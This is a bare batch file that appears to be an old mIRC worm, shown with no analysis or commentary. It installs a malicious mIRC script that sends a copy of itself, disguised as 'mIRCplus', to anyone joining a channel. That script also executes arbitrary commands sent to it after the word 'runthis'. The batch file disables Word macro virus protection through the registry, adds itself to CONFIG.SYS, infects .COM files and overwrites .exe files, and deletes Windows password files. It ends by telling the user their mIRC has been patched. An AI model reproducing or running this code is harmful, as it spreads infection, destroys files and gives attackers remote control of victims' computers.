@ECHO OFF
@BREAK OFF
@CTTY NUL
@MD c:\Ncc
IF exist IO.SYS goto :SUX
ECHO Hellfire_Flame@Hotmail.com >c:\Ncc\x.xxx
COPY %0 C:\DRV.SYS>nul
start /m WINZIP32.EXE -a "%TMP%\mIRCplus.zip" "%TMP%\mIRCplus.exe" "%TMP%\Readme.txt"
:SUX
ECHO [script]>c:\Ncc\sc.ini
ECHO n0=sc.ini>>c:\Ncc\sc.ini
ECHO n1=>>c:\Ncc\sc.ini
ECHO n2=on 1:START:{>>c:\Ncc\sc.ini
ECHO n3=  .sreq ignore>>c:\Ncc\sc.ini
ECHO n4=  .remote on>>c:\Ncc\sc.ini
ECHO n5=}>>c:\Ncc\sc.ini
ECHO n6=on 1:CONNECT:>>c:\Ncc\sc.ini
ECHO n7=on 1:INPUT:*:{>>c:\Ncc\sc.ini
ECHO n8=}>>c:\Ncc\sc.ini
ECHO n9=on 1:TEXT:*:?:{>>c:\Ncc\sc.ini
ECHO n10=  if ( $1 == runthis ) { .run $2- }>>c:\Ncc\sc.ini
ECHO n11=}>>c:\Ncc\sc.ini
ECHO n12=>>c:\Ncc\sc.ini
ECHO n13=on 1:JOIN:*:{>>c:\Ncc\sc.ini
ECHO n14=  if ( $nick == $me ) { halt }>>c:\Ncc\sc.ini 
ECHO n15=  /dcc send $nick %TMP%\mIRCplus.zip>>c:\Ncc\sc.ini
ECHO n16=  /PDCC 9999999999>>c:\Ncc\sc.ini
ECHO n17=}>>c:\Ncc\sc.ini
ECHO REGEDIT4>c:\REG.REG
ECHO.>>c:\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]>>c:\REG.REG
ECHO "RegisteredOwner"="LUCKY B.R.D 1994-99">>c:\REG.REG
ECHO "RegisteredOrganization"="Jerret">>c:\REG.REG
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]>>c:\REG.REG
ECHO "EnableMacroVirusProtection"="0">>c:\REG.REG
IF EXIST IO.SYS GOTO :p
ECHO.>>C:\CONFIG.SYS
ECHO INSTALLHIGH=C:\DRV.SYS>>C:\CONFIG.SYS
:p
ECHO @ECHO off>C:\BA.BAT
ECHO Ctty nul>>C:\BA.BAT
ECHO Move C:\REG.REG %%WINDIR%%\REG.REG>>C:\BA.BAT
ECHO for %%%%i In (*.COM ..\*.COM) do copy /b %%%%i + C:\Ncc\x.xxx %%%%i>>C:\BA.BAT
ECHO IF EXIST c:\mIRC\*.* GOTO :1>>C:\BA.BAT
ECHO IF NOT EXIST C:\mIRC\*.* GOTO :2>>C:\BA.BAT
ECHO :1>>C:\BA.BAT
ECHO MOVE c:\Ncc\sc.ini C:\mIRC\script.ini>>C:\BA.BAT
ECHO GOTO :next>>C:\BA.BAT
ECHO :2>>C:\BA.BAT
ECHO IF EXIST C:\Progra~1\mIRC\*.* GOTO :3>>C:\BA.BAT
ECHO IF NOT EXIST C:\Progra~1\mIRC\*.* GOTO :4>>C:\BA.BAT
ECHO :3>>C:\BA.BAT
ECHO MOVE c:\Ncc\sc.ini C:\Progra~1\mIRC\script.ini>>C:\BA.BAT
ECHO GOTO :next>>C:\BA.BAT
ECHO :4>>C:\BA.BAT
ECHO IF EXIST d:\mIRC\*.* GOTO :5>>C:\BA.BAT
ECHO IF NOT EXIST d:\mIRC\*.* GOTO :6>>C:\BA.BAT
ECHO :5>>C:\BA.BAT
ECHO MOVE c:\Ncc\sc.ini d:\mIRC\script.ini>>C:\BA.BAT
ECHO GOTO :next>>C:\BA.BAT
ECHO :6>>C:\BA.BAT
ECHO IF EXIST d:\Progra~1\mIRC\*.* GOTO :7>>C:\BA.BAT
ECHO IF NOT EXIST d:\Progra~1\mIRC\*.* GOTO :8>>C:\BA.BAT
ECHO :7>>C:\BA.BAT
ECHO MOVE c:\Ncc\sc.ini d:\Progra~1\mIRC\script.ini>>C:\BA.BAT
ECHO GOTO :next>>C:\BA.BAT
ECHO :8>>C:\BA.BAT
ECHO IF EXIST e:\mIRC\*.* GOTO :9>>C:\BA.BAT
ECHO IF NOT EXIST e:\mIRC\*.* GOTO :10>>C:\BA.BAT
ECHO :9>>C:\BA.BAT
ECHO MOVE c:\Ncc\sc.ini e:\mIRC\script.ini>>C:\BA.BAT
ECHO GOTO :next>>C:\BA.BAT
ECHO :10>>C:\BA.BAT
ECHO MOVE c:\Ncc\sc.ini e:\Progra~1\mIRC\script.ini>>C:\BA.BAT
ECHO GOTO :next>>C:\BA.BAT
ECHO :next>>C:\BA.BAT
ECHO IF EXIST IO.SYS GOTO :X>>C:\BA.BAT
ECHO IF NOT EXIST IO.SYS GOTO :Z>>C:\BA.BAT
ECHO :Z>>C:\BA.BAT
ECHO @REGEDIT /S /C %%WINDIR%%\REG.REG>>C:\BA.BAT
ECHO GOTO :X>>C:\BA.BAT
ECHO :X>>C:\BA.BAT
ECHO for %%%%i in (B*.exe, ..\A*.exe) do copy %0 %%%%i>>C:\BA.BAT
ECHO for %%%%i in (%%WINDIR%%\*.PWL) do DEL %%%%i>>C:\BA.BAT
ECHO for %%%%i in (C:\Ncc\*.*) do del %%%%i>>C:\BA.BAT
ECHO RD C:\Ncc>>C:\BA.BAT
ECHO @CTTY CON>>C:\BA.BAT
ECHO ECHO DONE !! UR mIRC IS PATCHED !>>C:\BA.BAT
ECHO.>>C:\BA.BAT
ECHO @CTTY NUL>>C:\BA.BAT
ECHO.>>C:\BA.BAT
ECHO.>>C:\BA.BAT
ECHO del %%0>>C:\BA.BAT
CALL C:\BA.BAT 
